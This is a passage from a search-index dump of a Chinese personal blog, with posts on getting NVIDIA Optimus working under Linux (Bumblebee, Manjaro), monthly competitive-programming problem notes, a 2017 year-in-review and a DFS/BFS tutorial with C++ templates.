无论是欣赏高清影片、网络冲浪或是激战于3D游戏中，请牢记：NVIDIA®(英伟达™)为您带来您最渴求的超持久电池续航时间和出色的性能。 这个技术简单来说，就是自动计算你当前的程序是适合使用集显还是独显，然后自动切换。 看起来很棒对吧？其实的确很棒。但是问题在于…… 这个破玩意儿只有Windows有用！！！！ Linux下什么都没有。所以诞生了一个叫做Bumblebee的东西解决这个问题。 当然，我的Elementary死了，因为我一开始不知道这个东西，直接上闭源驱动然后轰炸了Xorg。 ","date":"2018-01-27","objectID":"/post/589e1e37/:1:0","tags":["Linux","Optimus","Manjaro","记录"],"title":"Linux与Optimus","uri":"/post/589e1e37/"},{"categories":["个人记录"],"content":"0x02. 一次失败的尝试 当我准备开始装系统的时候，我发现我好像曾经划出过50G装Deepin（然后告吹了），想了一下，又往游戏盘划出50G凑够100G装新系统（分区的时候甚至蓝屏了）。 一开始我选择了Fedora，这是财主家的大儿子，比较“作”。Fedora是RedHat的试验田，也是RedHat系最激进的一个发行版，近似于滚动更新（GCC源里面就是7.1.2激动死我了），我这种一直用Debian系的，看到这种Cutting Edge的发行版真的就跟乡下人进城一样。 安装过程很简单，Graphic Installer和CentOS的特别像，也是你装着来填信息，装好了重启就行。 这次失败失败在哪儿了呢？Bumblebee。 我纯净安装之后直接装驱动和Bumblebee，然后直接开机。一切都很好，除了一个问题：我必须插着HDMI线才能显示桌面。 然后我手写了xorg.conf，也用了nvidia-xconfig，都没什么作用。然后我在Fedora Fourm问，也没有什么结果。 ","date":"2018-01-27","objectID":"/post/589e1e37/:2:0","tags":["Linux","Optimus","Manjaro","记录"],"title":"Linux与Optimus","uri":"/post/589e1e37/"},{"categories":["个人记录"],"content":"0x03. Manjaro与问题解决 之后我尝试了各种发行版，Debian和Deepin的grub引导有问题，找不到vmlinux进不去系统。 在各种比较之后，我选择了Manjaro。包括Manjaro的MHWD，Linux的驱动精灵，解决了我很多问题。 然后出现了另一个莫名问题：不插充电线打不开机。 然后我来到了Manjaro Fourm，在两三天的讨论之后，我的问题成功解决了。 下面是这个问题的一点思路： 首先，Bumblebee解决的是显卡切换的问题。当然，Bumblebee是社区驱动的一个项目，完全做不到Windows下NVIDIA官方Optimus的效果。Bumblebee能让你手动切换使用的是哪一张显卡并进行操作，无法自动。 其次，Linux下存在两种驱动，开源的Nouveau和闭源的NVIDIA私有驱动，选择适合你的安装就行。我的电脑使用Nouveau更好，并且我也不用Linux打游戏，不需要闭源驱动。 启动的时候，和此部分有关的有两个部分：内核引导和电量管理。 内核引导：内核引导在grub时通过添加参数进行控制，具体有以下的两种问题： 是否启动了需要的module？如grub启动参数添加nomodeset将关闭所有module，此时你只有Linux和X11提供的最基本的图形支持； 会不会需要的驱动被屏蔽？如使用nouveau但是这一条在/etc/modprob.d/blacklist里面。 电量管理：开机的时候TLP等服务会进行电量管理，这一部分涉及到的问题跟上面类似。但是这里要讲一个问题，在像我这样比较新的系统上，假如出现电量管理的问题，尝试在grub引导参数中添加：acpi_osi=! acpi_osi='Windows 2009'，看一下问题是否还存在。acpi_osi=Linux也值得尝试，而XPS需要一些额外的设置。 这个是大概的问题解决思路。当然，这一部分问题实在是很多，这篇文章不能保证能涵盖多少情况。 下面是一些有用的链接，希望能帮助到你： Bumblebee项目主页 Bumblebee的各种发行版Wiki 我在Manjaro Forum的帖子，里面有一些有用的链接 至于我怎么安装和配置Manjaro？下一篇文章见。 ","date":"2018-01-27","objectID":"/post/589e1e37/:3:0","tags":["Linux","Optimus","Manjaro","记录"],"title":"Linux与Optimus","uri":"/post/589e1e37/"},{"categories":["趣题记录"],"content":"0x00. 前言 大家好，我是Ramen。 12月注定是很忙的一月，大作业验收+ACM新生杯，还有其他各种各样的事情。嘛，最后反正都能顺利解决的吧。 这个月也就打了很多比赛，感觉打比赛成为常态，学习停滞了，不是很好。下个月寒假，开始学习新的东西了！ GSoC 2018也要开始了，套词好像很难的样子，稍微准备准备吧。 我的答案仓库是 Click Me!。根据题号你能找到我的答案，但是我的答案有很大改进余地，欢迎与我探讨。 ","date":"2018-01-10","objectID":"/post/cd25800b/:1:0","tags":["ACM-ICPC","算法竞赛","算法","刷题","数据结构"],"title":"12月做题记录","uri":"/post/cd25800b/"},{"categories":["趣题记录"],"content":"0x01. 模板题 很忙的一个月，没刷模板题，跳过了。 哎！ ","date":"2018-01-10","objectID":"/post/cd25800b/:2:0","tags":["ACM-ICPC","算法竞赛","算法","刷题","数据结构"],"title":"12月做题记录","uri":"/post/cd25800b/"},{"categories":["趣题记录"],"content":"0x02. 趣题 思路有趣是做题最爽的，有趣的思路就是有趣的题目。有趣，也是我打ACM的本源动力嘛。 Monk and Operations Another India Site. 印度人在这方面是比中国人走得远，各种专门的面试网站算法网站，GSoC也是组团去的，真的是十分团结。这个网站也是十分热心，注册了之后我做了一道水题就没管了，结果好几封邮件问我怎么不来。 扯远了，看题。一个$n\\times m$的矩阵$A$，你可以进行四种操作： 选一行，把这一行全部加上$v1$； 选一行，这一行全部改成$v2$； 选一列，把这一列全部加上$v3$； 选一列，把这一列全部变成$v4$。 任意一种操作你可以执行无数次，但是每一个格子至多执行1种操作。也就是说，这个格子可以不执行操作，假如执行了，那就是上面的任意一种，也只能有这一种。 答案问的是最大的$F(x)$，其中$F(x)$我们这么定义： $$ F(x)=\\sum_{i=1}^{n}\\sum_{j=1}^{m}|a_{i,j}| $$ 这个题其实深入分析题意，我们知道，一个格子要么是本行被改，要么本列被改。有什么问题吗？很简单，一改就涉及一行或者一列，任何不同方向上的操作都会导致至少1个格子操作了两次。那实际上，这个题就是针对每行，针对每列计算最大$F(x)$，然后比较对行对列操作的最大值修改即可。简单吧？ 思路有点意思，一开始我以为需要状态压缩DP，后面再度分析才发现的确不难。 Almost Difference 车祸题。出题人错误估计答案范围，结果答案范围超过了$10^{18}​$，然后1k个人过的题目，hack phase开始之后就剩100+人了。我的答案对了，C++一发没过，改成python准备一试结果实现完比赛结束了。 题目本身是比较有趣的，给出序列，对所有数对求$d(x,y)$，其中$d(x,y)$这么定义： $$d(x,y)=\\begin{cases}y-x\u0026|x-y|\u003e1\\\\0\u0026|x-y|\\le1\\end{cases}$$ 其实一开始计算我想了很多办法，比如$d(x,y)+d(y,x)=0$，考虑用Manacher的方法去做，但是很明显的，这也是$\\mathcal{O}(n^2)$。后面突然发现，假如单纯定义$d(x,y)=y-x$，这个题可以转化成一类求后缀和问题，对于每个数$x_i$，$\\sum d(x_i,y)$就是$y_{sum}-k*x_i$。其中$k$是$x_i$后面数的个数，$y_{sum}$是$x_i$之后数的和，就是后缀和。那么现在问题就在于如何处理特殊情况。我们考虑顺序扫一遍，可以统计出任何一个数的出现次数，那么就好办了，考虑$x_i$之后有多少个$x_i-1$，答案自然加上这些数的差，显然是$1$，同理$x_i+1$也可以直接处理。那就是统计+后缀和+扫一遍，整体复杂度$\\mathcal{O}(n)$。 这个题的后缀和做法让我还是记忆犹新，这也是难得我在比赛时思路能如此清晰的一次。 Nephren gives a riddle Chinese round again！ 中国人的轮就是题目很有趣。 这一题很简单，给出基础字符串$f_0$，按照如下规则构造字符串：$f_n=s_0+f_{n-1}+s_1+f_{n-1}+s_2$。问$f_n$的$p$位置字符是什么。 这是一道无限生成字符串的题目，相似的题目很多，今年沈阳站A题也出过。 这一题如果就是耿直的下去做，一定会爆炸。因为$1\\le n\\le10^5$，同时一个点至多$10$次询问，那么整个时间直接抬走。这里第一步预处理考虑字符串长度，因为$|f_0|=75$，又知道$|s_0|=34,|s_1|=32,|s_2|=2$，我们使用递推公式$|f_n|=2\\times |f_{n-1}|+68$可以很快得到整个字符串的长度。由于$1\\le p\\le10^{18}$，我们几乎立即解出这个字符串满足$n\\le54$时需要对完整串搜索。那我们耿直一波？$10^{18}$个字符，抬走了。 这里做法其实应该是比较显然的，DFS。我们根据字符串长度，由于$f_n=s_0+f_{n-1}+s_1+f_{n-1}+s_2$，我们可以判断出这个位置是落在哪一节里面，然后不断DFS下去，可以找到独立的那一节，直接输出就行。 很有趣的题目，这个DFS可以说是很棒的题目了。 Inversion Counting 现场学习算法系列。 刚好是一个空缺。其实挺好的，前几个月停留在不知道要求什么，现在已经到要怎么求的状态了，是一种进步？ 题目其实一看就是卡时间的。给出一个$n$长度的正整数排列，然后给出$m$组翻转，每组为$[l_i,r_i]$。问每一步的逆序数的奇偶性。 一上来就直接求逆序数。根据我们知道的，朴素算法$\\mathcal{O}(n^2)$时间内能求，但是肯定会超时。 现场学习了树状数组求逆序数，树状数组就不讲了，主要是用树状数组怎么求，其实很简单，由于题目给出的是一个排列，那我们只需要单点更新同时统计。更新的时候我们把出现过的数置$1$，然后根据前缀和特性就可以求。这个方法核心在pos-getsum(num)，pos就是当前有多少个数，getsum(num)就是这个数前面有多少个数，那其实很简单，就是现在有的数减去前面的数，自然就是后面的数，后面所有的数都和这个数构成一组逆序，那后面有几个就有几组逆序。根据树状数组特性，知道这样复杂度是$\\mathcal{O}(nlogn)$。 当然，这只是顺便一提，这个题根本不用这么做。首先考虑对于一个长度为$k$的序列会有几组逆序。我们考虑$4,3,2,1$，这就是完全逆序，所以我们得到了$\\binom{k}{2}$，这也就是最多可出现的逆序对。那当我们整个翻转之后，整个顺序刚好颠倒，那假设前面占了$x$种，这里正好就是$\\binom{k}{2}-x$。好了，小学数学time，偶数加偶数等于偶数，偶数加奇数等于奇数。所以这里根本不用管有几种，加上$\\binom{k}{2}$万事大吉。所以这个题就解决了，甚至$\\binom{n}{2}=\\frac{n(n-1)}{n}$，$\\mathcal{O}(m)$解决战斗。 这个题有点意思，我们可以抛弃一些看似需要其实不需要的属性，然后求解。 Dividing the numbers 这个题，把$1,2,\\cdots,n$划分成两个非空集合，让$|sum(s_l)-sum(s_r)|$尽可能的小。构造解问题。 这个其实很容易就能知道，这些数的和要不为奇数要不为偶数，那么两份均分后要不两份大小相等，要不这两份的差为1。接下来要考虑怎么切分，根据$\\sum^{n}_{i=1}i=\\frac{n(n-1)}{2}$，那么实际上可以观察出我们这个和的大小会均分成4份。这里很容易可以看出来，可以模拟试一下。那么我们知道对于连续的四个数$i,j,k,l\\in{1,2,\\cdots,n}$，这四个数必定满足$i+l=j+k$。那到这一步就简单了，挨个遍历四元集$(i,j,k,l)$，然后构造即可。 这个题难在拆分算法构造上，一开始很容易直接二分然后两头构造，但是并不是所有可行元素都是集中在两头和中间的。这里我们的做法是一种分治：按大小为4划分子块，保证每个子块的划分都满足题目要求，那完全划分完后的整个序列也满足题目要求。 ","date":"2018-01-10","objectID":"/post/cd25800b/:3:0","tags":["ACM-ICPC","算法竞赛","算法","刷题","数据结构"],"title":"12月做题记录","uri":"/post/cd25800b/"},{"categories":["趣题记录"],"content":"0x03. 难题 这个月好像没什么让我印象深刻的难题……可能还是因为太忙了做题少…… That’s All. 1月要好好刷题啦！ ","date":"2018-01-10","objectID":"/post/cd25800b/:4:0","tags":["ACM-ICPC","算法竞赛","算法","刷题","数据结构"],"title":"12月做题记录","uri":"/post/cd25800b/"},{"categories":["个人记录"],"content":"2017年过去了。每一年都不是平凡的一年，2017年却更显不平凡。Nintendo Switch在3月发售之后，这9个月靠两个第一方满分神作一路平A到了现在；虽然《PUBG》成为了今年爆款，但是它也再一次引发了全民反外挂的热潮。 游戏界这是两件头顶大事，但是整个社会并不太平。去年的江歌案在今年年末再次引爆，我们见到的了太多的人情冷暖，却也再次被这种冷漠和算计激怒；而各种恐怖袭击和令人惊恐的事件也层出不穷。 但是今年也同样是很棒的一年，中国独立游戏大放异彩，动画和影坛今年也有很多神作涌现，同人音乐总有很棒的曲子。 这不是任何的哪一年，这是2017年。 引用 It was the best of times, it was the worst of times. ","date":"2017-12-31","objectID":"/post/a7da9690/:0:0","tags":["年终总结","2017","个人记录"],"title":"Good Bye 2017","uri":"/post/a7da9690/"},{"categories":["个人记录"],"content":"一、收获 2017年是很累的一年。但是累意味着收获。 这一年，我正式开始写博客了。虽然写博客不是一件很简单的事，同样的，这也是一件回报不是很明显的事，但是我还是决定坚持下去。当然，坚持下来了，也开始有了自己的固定产出，很多时候有一些写文章的动力有了地方可以发东西了。 这一年，从林姥爷那里对整个程序语言设计理论有了一个大概的了解，也对整个FP这边有了一定的学习。用我的话来说，这一块十分有趣，也激起了我搞理论计算机的兴趣。能遇到有趣的东西是一件十分幸运的事情，我今年是十分幸运的。 这一年，我正式确定了要步入Competitive Programming这个领域。这是一个竞技性很强的领域，也要求极广的知识面和极强的程序设计功底。诚然，我还是一个 newbie，或者说按照CF的分法，pupil，但是我仍然相信，时间不会辜负人，只要有了努力和付出以及正确的方向，总会有收获的。 这一年，我开始了Rust和Haskell的学习，也没有放下Python和C++。对我来说，Rust提供了一种全新的模型，让我可以从另一个角度去审视资源管理这个问题，可以说，Rust在面向底层这一仗上已经打败了Go；而Haskell正式带我进入了Functional Programming和Principle of Programming Language这两个领域，这两个领域正如上面所说，十分的有趣。当然，我还是不喜欢Java。 这一年，我玩到了《WILL：美妙世界》、《新弹丸论破V3》、《Hollow Knight》等优秀的游戏，这些游戏即使到现在我也能回味起它们的优秀与韵味，是十分难得的。我真的十分高兴今年能看到我十分喜欢的《塞尔达》出了一款十分优秀的作品，我十分喜欢的系列《银河战士》也将发售新作了，这对我而言也是一件幸事。 这一年，我找到了志同道合的伙伴，无论是网络上还是现实中，经常能进行质量比较高的讨论，也有一群非常好的伙伴，能够愉快的吹水讨论，生活无比充实。 这一年，我正式在若维俱乐部发光发热，进我的所能去做一些事情，也很有幸成为了技术部的部长。在项目上，我参加了两个项目的全部工作，也做了一个项目的技术顾问。听起来名头高大上，实际上都仰仗于学长学姐和老师的提携。不过，这种成长，令我欣喜。 这一年，我实现了我愿望的一半，好好的写一点代码。 这一年，我收获了许多。 ","date":"2017-12-31","objectID":"/post/a7da9690/:1:0","tags":["年终总结","2017","个人记录"],"title":"Good Bye 2017","uri":"/post/a7da9690/"},{"categories":["个人记录"],"content":"二、遗憾 这一年，也是遗憾的一年。 2017年，说好的DDM复活没有来。是的，算法竞赛和学习占了我生活的大部分时间，DDM也没有起来。忙是肯定的，但是对这件事不上心也是一个十分明显的问题，DDM基本毫无进展。身为站长的我是需要检讨。2018年希望能够有一定的时间，能够把重心放到DDM上。 青岛站被打爆是一件可以预料的事，学习和练习本来就不足，队伍的配置也有一定的问题。知耻而后勇，后面的这段时间应该会全心全意投入到训练当中，成为一名称职的算法竞赛选手。 下半年的考试成绩很不尽如人意，一方面是因为我把重心放到了算法竞赛上，另外一方面也是下半年很忙，自己对这几门科目不够重视。 原本预定的很多要做的基本都没怎么做，学习进度严重停滞，这一年时间安排的确是一个问题。 这一年，我也有很多遗憾。 ","date":"2017-12-31","objectID":"/post/a7da9690/:2:0","tags":["年终总结","2017","个人记录"],"title":"Good Bye 2017","uri":"/post/a7da9690/"},{"categories":["个人记录"],"content":"三、感想 用我跟朋友讨论的话来说，“2017是我一生中运气比较好的一年”。 我仍然记得去年看到Nintendo Switch的宣传片时跟室友说的“我一定要买这台机器”，而这个梦想的实现也近在咫尺了。我今年遇到了十分好的队友，虽然青岛站暂时失利，但是我们仍然对明年的比赛充满了信心和斗志。我今年在一个十分棒的地方有了自己的一席之地，也在成为一名优秀程序员的路上脚踏实地的走着。我今年 是的，今年是我一生中运气比较好的一年。 博客这件事来说，写博客有三个初衷：表达一点东西，记录一点东西，探索一点东西。今年在记录上做的有点不错，包括之前对Rust的笔记，几次算法笔记也都坚持写了下来，效果也比较好；表达一点东西质量仍然需要提高，经常会讲不清，讲的乱，没有一个很详细的表达，之后需要提高；探索上，我仍然还在探索我写文章的多样性和全面性，但是还是理工科思维的限制，总是在这几种模式中打转。 虽然有很多遗憾，但是说得太多也没什么意思。2017对我还是很好的，虽然有不快，有伤感，但是一切都在正轨上也就很好了。自从上了大学也学会说“知足常乐”了，哈哈。 ","date":"2017-12-31","objectID":"/post/a7da9690/:3:0","tags":["年终总结","2017","个人记录"],"title":"Good Bye 2017","uri":"/post/a7da9690/"},{"categories":["个人记录"],"content":"四、展望 于是，离2017年结束，也就不到1个小时了。2017年，总之无论再怎么留恋，还是过去了。 不论是哪一年，我都不觉得有什么需要太过留念的，时间的车轮滚滚前行，无论我们做什么都是停不下来的。那么，我们为何不接受这种状态，砥砺前行呢？ 新的一年了，新的目标也定下来了。 引用 希望能好好打一点游戏，能好好做一点题，能拿一块金牌。 希望一切安好。 那我们2018见！ ","date":"2017-12-31","objectID":"/post/a7da9690/:4:0","tags":["年终总结","2017","个人记录"],"title":"Good Bye 2017","uri":"/post/a7da9690/"},{"categories":["趣题记录"],"content":"0x00. 前言 大家好，我是Ramen。 11月经历了很多事情，最主要的就是青岛站被打爆。关于青岛站的看我前面一篇文章。 其次是事情越来越多，很多时候不知道自己在忙什么，恍惚间又堕落了一下午，忙了一个晚上也不知道做了什么。 但是起码刷题坚持下来了，哈。 目前主要就是做lrj紫书和kuangbin系列题目查漏补缺，比赛主要在Codeforces、AtCoder和CS Academy上打（我也想打TopCoder啊，但是都是半夜的SRM打不动啊QAQ）。 不多感叹了，Here We Go。 我的答案仓库是 Click Me!。根据题号你能找到我的答案，但是我的答案有很大改进余地，欢迎与我探讨。 ","date":"2017-11-26","objectID":"/post/3ce06fb1/:1:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"11月做题记录","uri":"/post/3ce06fb1/"},{"categories":["趣题记录"],"content":"0x01. 模板题 本期的模板题主要是刷完了kuangbin带你飞第一期，具体的点击查看就好，主要是BFS与DFS。 这一期没做什么模板题，时间不是很多。12月要看一手新东西了。 ","date":"2017-11-26","objectID":"/post/3ce06fb1/:2:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"11月做题记录","uri":"/post/3ce06fb1/"},{"categories":["趣题记录"],"content":"0x02. 趣题 组合数学十分有意思。很多时候有些题思路真的很晕，感觉还是思路杀，这个东西不积累不行。 Ralph And His Magic Field Another Chinese Round。又是一道组合数学的题目，十分有趣。 题意很简单，$n\\times m$方格里面放数，保证每一行每一列乘积均为$k$，求可行方案数对$1e9+7$去模。题目限制了$k\\in {-1,1 }$，那这个随意放数字不就是$1$和$-1$两种。其次考虑一个问题，如果$n+m$是一个奇数而$k=-1$的话，我们怎么放都不可能放的满足要求，这一点应该比较容易想到，想不到的话画一个$3\\times 4$的方格自己尝试一下就行。 接下来难点在于怎么剩下的划分。考虑对于任一行，对于这一行的排列来说，假如前$m-1$个数确定了，那根据规则，最后这$1$个数也确定了。对于列同理。所以最终需要考虑的格子只有$(n-1)\\times(m-1)$个。最终答案就是$2^{(n-1)\\times(m-1)}$。 这里有一个问题，这个数太过巨大，而且算起来很麻烦。这里首先第一步的处理是使用快速幂，这里带来的是时间上的优化。第二步，根据幂的运算律：$2^{(n-1)\\times(m-1)}=(2^{(n-1)})^{(m-1)}$，那这里我们就先计算内部的$2^{(n-1)}$，再计算外部就能保证不会溢出了。 这个题比赛的时候前中期过的人甚至没有C多，太凶险了。然而C在System Test干掉了2/3的人更凶险。 另外，这个题我比赛的时候想的是枚举第一行和第一列，然后reduce到$(n-1)\\times(m-1)$的情况，完全反向了，不过还是很有启发性，很不错的题目。 Short Program 另一道很有趣的题目。你有一台运算机，可以接受三种操作：与或非，以及一个操作数。有个人写了一个小程序，但是太长了，需要你简化到5步以内。题解看这一篇比我讲的好。 这个题有趣的地方在于对于位运算的化简。关键的一个点是，我们需要构建这样一个映射： $$procedure(x)=f(x)=(((x\\times a)+b)\\oplus c)$$ 而我们的构造方法是使用中间变量$x$和$y$，看$x$与$x’$、$y$与$y’$最后的真值对应关系来计算出$a$、$b$、$c$。这个思路很巧妙，很多时候我们做位运算的题目可以根据初始状态和终止状态来获得映射关系。 Sudoku 题意十分简单，给出一个$n\\times n$大小的数独，问当前这个解是否是一种正解（也就是说行、列、块没有重复数字）。 这个题很简单吧？但是这里我拿出来这道题是因为这种做法： a = to_string(t) + \" shows on row \" + to_string(i); b = to_string(t) + \" shows on column \" + to_string(j); c = to_string(t) + \" shows on section \" + to_string(i / 3) + \",\" + to_string(j / 3); if (hash.count(a) || hash.count(b) || hash.count(c)) valid = false; hash.insert(a); hash.insert(b); hash.insert(c); 这种做法真的巧妙！利用了hash的性质，很漂亮的解决了这个问题，我从微博看到的，这样的hash做法是第一次见到，真的是让我大呼\"Eureca!\" ","date":"2017-11-26","objectID":"/post/3ce06fb1/:3:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"11月做题记录","uri":"/post/3ce06fb1/"},{"categories":["趣题记录"],"content":"0x03. 难题 新栏目，讲讲那些困扰了我一段时间的题目。 Olya and Energy Drinks Olya在一张$n\\times m$大小的图上，每次可以冲刺$1-k$的距离，问给定两个点需要的最短时间。 标准BFS没错吧？$\\mathcal{O}(n\\cdot m\\cdot k)$，狂吃TLE。 这个题第一步剪枝很容易想到，我们可以在每次更新的时候直接更新同方向$1-k$距离的所有点，然后就能得出答案。 但是在这一步剪枝就有一个问题，这个题的层次不只是空间层次，还有时间层次。比如，以下两个移动序列都是合法的： $$(1,1)\\to\\mathcal{O}(1,3)\\to\\mathcal{O}(3,3)\\\\(1,1)\\to\\mathcal{O}(1,2)\\to\\mathcal{O}(2,3)\\to\\mathcal{O}(3,3)$$ 那么肯定不能直接开一个vis数组，因为这样会干扰其他路径。这里有两种做法： 考虑距离 我们在每次更新到当前点的最小距离，一旦出现更小的就进行更新，那么我们经过这一层次搜索之后，我们就能在dis[ex][ey]处得到最小距离。 考虑方向 首先根据BFS的性质，假如我们到达第$l$个点，我们必定是得到的是从$l-1$点方向上所有点到$l$的最小距离，那么同理对$l-1$也可以讨论。这么递推回去的结果是，从起点到第$l$个点，沿着这一种方向上到达的最小距离只需要一次BFS就能得到。同时，从相同路径方向的不同冲刺距离下到达$l$点的最短步数也就是这个BFS的结果。那么第一个层次解决了，我们考虑第二个层次。每一个点都有可能成为其他店的中转点，然后根据上面的讨论，每一个方向上的最短距离都可以一步BFS得到，所以我们只需对当前点考虑四个方向进来的步数即可。所以我们的剪枝就是对每个终点看进入方向，假如没搜索过，就放入搜索，否则就不再搜索。 两个思路都很巧妙，但是我觉得第二个思路更有思维深度和BFS特性，我最后选择第二种做法。 这个月很多时候面对很多题解和别人代码都感觉头晕，很多时候对于为什么使用min和max，变量间是什么关系真的毫无想法，可能真的是做题不足。 还干过什么变量开小了（答案可能是long long范围结果开了个int），真的是蠢。 一道魔方题手打287行代码然后一发A还是很爽的（看了标程感觉自己是一个智障）。 努力吧。 ","date":"2017-11-26","objectID":"/post/3ce06fb1/:4:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"11月做题记录","uri":"/post/3ce06fb1/"},{"categories":["算法笔记"],"content":"这是kuangbin带你飞专题系列讲解\u0026题解。 从青岛站回来后深感自己菜，然后开始按专题刷题。kuangbin大神的这一系列专题真的不错，写起来很练基础。同时，练习的时候写一篇题解也是很好的加深印象的方法。 老规矩，所有代码你都可以在我的Github答案仓库找到。 这一组专题会讲解一些基础知识点，然后是逐题题解。我个人的建议是先看题目，然后看算法解析，做题时再考虑题解。 Have fun. 这一期专题的vjudge位置：Click me!，我的答案位置：Click me!。 ","date":"2017-11-18","objectID":"/post/346bf025/:0:0","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"0x01 算法讲解 这一期的主要算法是深度优先搜索（Depth First Search，简称DFS）和深度优先搜索（Breath First Search，简称BFS）。 讲之前，考虑如下图： 图 1 图 2 可看出第一张为无向图，第二张为有向图。之后的讲解都将以这两张图为例子。 ","date":"2017-11-18","objectID":"/post/346bf025/:1:0","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"1.深度优先搜索 深度优先搜索，顾名思义，就是一条道走到黑的搜索，考虑图A，我们搜索时按照以下路径： A -\u003e B -\u003e E -\u003e G -\u003e D -\u003e C -\u003e F 可以看出，我们的走法是走到头为止，每次当一个节点走到头，我们即回溯到第一个分叉点，从另一个出发。 下面针对第二张图举例： A -\u003e B -\u003e E -\u003e D -\u003e G -\u003e F -\u003e C 这里要注意，无向图下优先级应根据实际问题定义。 从这里大家可以看出，深度优先搜索是基于栈的，也就是说，我们走到一个节点，把上一个节点入栈，继续往下搜索，直到搜索到末尾，出栈上一个节点，查看是否有其他路径，若有则继续搜索，没有就出栈再上一个节点，直到栈为空即搜索停止。在实际写代码过程中，由于函数调用是在栈上的，我们可以使用递归调用的方法来进行。所深度优先搜索是比较好写的。 深度优先搜索通常与回溯法合用，此时我们需要对状态进行标记。 这是一个通常的板子： const int SIZE = 1e5 + 10; int board[SIZE]; // ==\u003e 数据域 bool vis[SIZE]; // ==\u003e 标记是否到达过 void dfs(int i) { if(vis[i]) // ==\u003e 访问过 return; // 搜索操作... vis[i] = true; // ==\u003e 标记已访问 dfs(i + 1); // ==\u003e 调整搜索方向 // vis[i] = false; // ==\u003e 回溯搜索 } ","date":"2017-11-18","objectID":"/post/346bf025/:1:1","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"2.广度优先搜索 对于图A，搜索路径如下： A -\u003e B -\u003e D -\u003e C -\u003e E -\u003e F -\u003e G 对于B： A -\u003e B -\u003e D -\u003e C -\u003e E -\u003e F -\u003e G 这里看不出来什么，实际上就是按照层次去搜索，每次都搜索同一层次的。 这里看出，广度搜索是基于队列的，我们搜索都是把同层次入队，然后队顶出队搜索并重复上述过程直到队列为空。这里我们需要队列的配合，所以BFS也比DFS难写一点。 下面是一个比较常用的板子： #include \u003cqueue\u003e // ==\u003e 引入队列 const int SIZE = 1e5 + 10; int board[SIZE]; // ==\u003e 数据域 bool vis[SIZE]; // ==\u003e 标记是否到达过 struct Node { int data; // ==\u003e 数据域 //... ==\u003e 辅助信息域 }; // ==\u003e 辅助节点，用于暂存信息 int bfs() { queue\u003cNode\u003e q; Node s; // ==\u003e 起始节点 Node t; // ==\u003e 临时节点 Node n; // ==\u003e 变换用节点 // 对s做一些操作... q.push(s); while(q.size()) { t = q.front(); q.pop(); // ==\u003e 出队 n = t; // 对n做一些操作 if(vis[n.data]) continue; // ==\u003e n已到达过，跳过 vis[n.data] = true; // ==\u003e 标记n已到达 q.push(n); } } 当然，网上对这二者还有更好的讲解，大家最好参考其他的一起看，集思广益。 ","date":"2017-11-18","objectID":"/post/346bf025/:1:2","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"0x02 题解 注意，请先尝试自己做再看题解。本组题目链接为：Click me!。 题解 ","date":"2017-11-18","objectID":"/post/346bf025/:2:0","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"A. 棋盘问题 – POJ 1321 考点：DFS 难度：简单 最简单的DFS题，只是注意在搜索时，先进行一次层级遍历。也就是说： dfs(row + 1, m); 这样就能在可放位置大于棋子数目的时候搜索较低层级。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:1","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"B. Dungeon Master – POJ 2251 考点：BFS 难度：适中 可以说是一道标准的BFS题目，难度略微有一点大。主要本题是在三维迷宫中，这个能理清就很好做。注意移动方向只有6种，然后直接BFS即可。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:2","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"C. Catch That Cow – POJ 3278 考点：BFS 难度：简单 比上一题简单很多倍的BFS。两个坑点： 退出条件时输出0，此时意味着John就和牛在一个位置 vis数组开$200000$，因为存在两倍传送操作，防止越界。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:3","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"D. Fliptile – POJ 3279 考点：DFS、异或运算、枚举 难度：困难 [点灯游戏][1]。大概意思就是，你点击一个方块，会把周围方块全部状态翻转，游戏目的是把整个盘面都翻转过来。 本题要求输出解，多解情况下输出字典序最小的解。 这个题解法多种多样，其中最优的也是最难的解法是高斯消元法解$GF(2)$域上的异或方程组。这部分的研究我之后单独开一篇文章来讲，这里就讲最简单的DFS做法。 考虑其中一个块，假如这个块被翻转了两次，那说明这个块不应该被翻转。考虑任意一个块$A(i,j)$，假如这个块需要被翻转，能影响它的有哪些？上下左右四个方向。于是我们可以逐行处理，第一行全部翻转，然后是第二行……直到倒数第二行结束之后我们判断一下最后一行是否全部是$1$即可。 这个题思路和代码都来自《挑战程序设计竞赛》，这也是一本好书，可以看一看。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:4","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"E. Find The Multiple – POJ 1426 考点：DFS，构造 难度：适中 被$digits(res)\\le 